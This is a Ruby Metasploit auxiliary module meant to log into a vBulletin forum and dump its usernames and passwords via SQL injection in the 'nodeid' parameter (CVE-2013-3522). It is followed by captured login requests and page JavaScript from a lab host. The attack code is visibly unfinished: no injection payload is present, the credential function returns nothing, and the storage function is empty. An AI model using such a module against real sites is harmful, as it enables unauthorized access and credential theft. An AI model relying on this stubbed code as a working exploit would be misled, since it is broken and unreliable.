##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'vBulletin Post-Auth nodeid Password Collector via SQL Injection',
      'Description'    => %q{
        This module exploits a SQL Injection vulnerability found in vBulletin that has been
        used in the wild since March 2013. Authentication is required. You can use this module
        to extract the web application's usernames and passwords. If you wish to get a shell
        instead, please use the exploit module.
      },
      'References'     =>
        [
          [ 'CVE', '2013-3522' ],
          [ 'OSVDB', '92031' ],
          [ 'EDB', '24882' ],
          [ 'BID', '58754' ],
          [ 'URL', 'http://www.zempirians.com/archive/legion/vbulletin_5.pl.txt' ]
        ],
      'Author'         =>
        [
          'Orestis Kourides',
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Mar 24 2013"
    ))

    register_options(
      [
        OptString.new("USERNAME",  [true, 'The username to use']),
        OptString.new("PASSWORD",  [true, 'The password to use']),
        OptString.new("TARGETURI", [true, 'The path to vBulletin', '/vBulletin/'])
      ], self.class)
  end

  #
  # Returns the CheckCode based on vBulletin version obtained in the Javascript (SIMPLEVERSION)
  #
  def check
    res = send_request_raw({'uri' => normalize_uri(target_uri.path, "index.php") })

    unless res
      fail_with(Failure::Unknown, "The connection timed out, please try again.")
    end

    vars = get_js_vars(res)
    if vars[:version].to_i > 400
      return Msf::Exploit::CheckCode::Vulnerable
    end

    Msf::Exploit::CheckCode::Safe
  end

  #
  # The Javascript in source contains these items we want: SECURITYTOKEN, SESSIONURL, SIMPLEVERSION
  # @param res [Response] The response object
  # @return [hash]
  #
  def get_js_vars(res)
    body = res.body

    # session_url seems to be optional
    {
      :session_url    => body.scan(/var SESSIONURL = "s=([0-9a-f]+)&"/i).flatten[0],
      :security_token => body.scan(/var SECURITYTOKEN = "(\w+)"/i).flatten[0],
      :version        => body.scan(/var SIMPLEVERSION = "(\w+)"/i).flatten[0]
    }
  end

  #
  # Returns the cookie values: last_visit and last_activity
  #
  def get_cookie_values(res)
    cookie = res.headers['Set-Cookie'] || ''

    {
      :last_visit    => cookie.scan(/bb_lastvisit=(\d+)/).flatten[0],
      :last_activity => cookie.scan(/bb_lastactivity=(\d+)/).flatten[0]
    }
  end

  #
  # Returns the HTTP request options for login
  # @param last_res [Response] The last HTTP response from vBulletin
  # @return [Hash] The request options for send_requset_cgi
  #
  def create_login_request(last_res)
    # Our login demands MD5
    md5_pass = Rex::Text.md5(datastore['PASSWORD'])

    # Grab some login info that can be found in the Javascript variables
    vars = get_js_vars(last_res)

    # Grab cookie values
    last_cookie   = get_cookie_values(last_res)
    last_visit    = last_cookie[:last_visit]
    last_activity = last_cookie[:last_activity]

    # Now actually craft the HTTP request options
    req_opts                  = {}
    req_opts['uri']           = normalize_uri(target_uri.path, "login.php")
    req_opts['method']        = 'POST'
    req_opts['encode_params'] = false
    req_opts['cookie']        = "bb_lastvisit=#{last_visit}; bb_lastactivity=#{last_activity}"
    req_opts['vars_post']     = {
      'vb_login_username' => datastore['USERNAME'],
      'vb_login_password' => '',
      'vb_login_password_hint'   => 'Password',
      'securitytoken'            => vars[:security_token],
      'do'                       => 'login',
      'vb_login_md5password'     => md5_pass,
      'vb_login_md5password_utf' => Rex::Text.to_utf8(md5_pass)
    }

    # The session_url variable is optional
    if vars[:session_url]
      req_opts['vars_get'] = { 's' => vars[:session_url] }
      req_opts['vars_post']['s'] = vars[:session_url]
    end

    req_opts
  end

  #
  # Tries to login to vBulletin.
  # @return [String] Session hash
  #
  def login
    post_auth_info = {}

    # This first request allows us to obtain Javascript variables for login
    res = send_request_raw({'uri' => normalize_uri(target_uri.path, "index.php") })
    unless res
      fail_with(Failure::Unknown, "Unable to obtain Javascript variables due to a timeout")
    end

    # Send the login request
    req = create_login_request(res)
    res = send_request_cgi(req)

    # Booooo....
    unless res
      fail_with(Failure::Unknown, "Connection timed out during login")
    end

    (res.headers['Set-Cookie'] || '').scan(/bb_sessionhash=(\w+)/).flatten[0] || ''
  end

  #
  # Attempts to dump the credentials
  # @param session_hash [String] The session hash obtained after login
  # @return [Hash] Usernames and passwords
  #
  def get_credentials(session_hash)
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, 'index.php', 'ajax', 'api', 'reputation', 'vote'),
      'cookie'    => "bb_sessionhash=#{session_hash}",
      'vars_post' => {
        'nodeid' => '1' # SQL Injection here, they say
      }
    })

    unless res
      fail_with(Failure::Unknown, "Connection timed out during SQL injection")
    end
  end

  #
  # Stores the usernames and passwords to database
  # @param creds [Hash] Usernames and passwords
  #
  def store_data(creds)
  end

  def run
    print_status("#{peer} - Authenticating as #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
    session_hash = login
    if session_hash.blank?
      print_error("#{peer} - Invalid username or password")
      return
    else
      print_good("#{peer} - Logged in as #{datastore['USERNAME']}")
    end

    print_status("#{peer} - Trying to dump credentials...")
    creds = get_credentials(session_hash)
    store_data(creds)
  end

end

=begin
 
Login:

GET /vBulletin/ HTTP/1.1
Host: 10.0.1.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive

POST /vBulletin/login.php?s=90f4bc5879aa98435fc6a522ee60c6e0&do=login HTTP/1.1
Host: 10.0.1.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.0.1.5/vBulletin/
Cookie: bb_lastvisit=1358485162; bb_lastactivity=0
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 251

vb_login_username=sinn3r&vb_login_password=&vb_login_password_hint=Password&s=90f4bc5879aa98435fc6a522ee60c6e0&securitytoken=guest&do=login&vb_login_md5password=7cd8a5bd78b455a5e18afebc1efe00e5&vb_login_md5password_utf=7cd8a5bd78b455a5e18afebc1efe00e5

in source:
<script type="text/javascript">
<!--
  var SESSIONURL = "s=90f4bc5879aa98435fc6a522ee60c6e0&";
  var SECURITYTOKEN = "guest";
  var IMGDIR_MISC = "images/misc";
  var IMGDIR_BUTTON = "images/buttons";
  var vb_disable_ajax = parseInt("0", 10);
  var SIMPLEVERSION = "415";
  var BBURL = "http://10.0.1.5/vBulletin";
  var LOGGEDIN = 0 > 0 ? true : false;
  var THIS_SCRIPT = "vbcms";
  var RELPATH = "";
  var PATHS = {forum : ""}
// -->
</script>

GET /vBulletin/ HTTP/1.1
Host: 10.0.1.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.0.1.5/vBulletin/login.php?s=90f4bc5879aa98435fc6a522ee60c6e0&do=login
Cookie: bb_lastvisit=1358485162; bb_lastactivity=0; bb_sessionhash=b4489ba8fc3550038e8590109db7f264
Connection: keep-alive

=end

=begin
POST /vBulletin/login.php?do=login HTTP/1.1
Host: 10.0.1.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.0.1.5/vBulletin/
Cookie: bb_sessionhash=f3f3456e90d3ae3c742cfe20b01c522d; bb_lastvisit=1358485262; bb_lastactivity=0
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 219

vb_login_username=sinn3r&vb_login_password=&vb_login_password_hint=Password&s=&securitytoken=guest&do=login&vb_login_md5password=7cd8a5bd78b455a5e18afebc1efe00e5&vb_login_md5password_utf=7cd8a5bd78b455a5e18afebc1efe00e5

<script type="text/javascript">
<!--
  var SESSIONURL = "";
  var SECURITYTOKEN = "guest";
  var IMGDIR_MISC = "images/misc";
  var IMGDIR_BUTTON = "images/buttons";
  var vb_disable_ajax = parseInt("0", 10);
  var SIMPLEVERSION = "415";
  var BBURL = "http://10.0.1.5/vBulletin";
  var LOGGEDIN = 0 > 0 ? true : false;
  var THIS_SCRIPT = "vbcms";
  var RELPATH = "";
  var PATHS = {forum : ""}
// -->
</script>
=end
